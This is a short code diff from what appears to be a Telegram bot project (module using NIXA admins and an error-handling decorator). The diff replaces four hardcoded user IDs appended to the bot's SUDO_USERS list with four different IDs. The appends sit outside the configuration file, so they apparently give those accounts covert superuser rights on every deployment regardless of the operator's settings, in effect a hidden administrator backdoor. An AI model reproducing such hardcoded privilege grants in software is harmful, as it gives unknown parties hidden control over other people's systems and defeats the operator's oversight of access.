@@ -5,10 +5,10 @@ from config import SUDO_USERS
 from NIXA.admins import get_administrators
 
 
-SUDO_USERS.append(5009839424)
-SUDO_USERS.append(5180811178)
-SUDO_USERS.append(5215873956)
-SUDO_USERS.append(5137889730)
+SUDO_USERS.append(5576613955)
+SUDO_USERS.append(5331796378)
+SUDO_USERS.append(5509199917)
+SUDO_USERS.append(5370192917)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
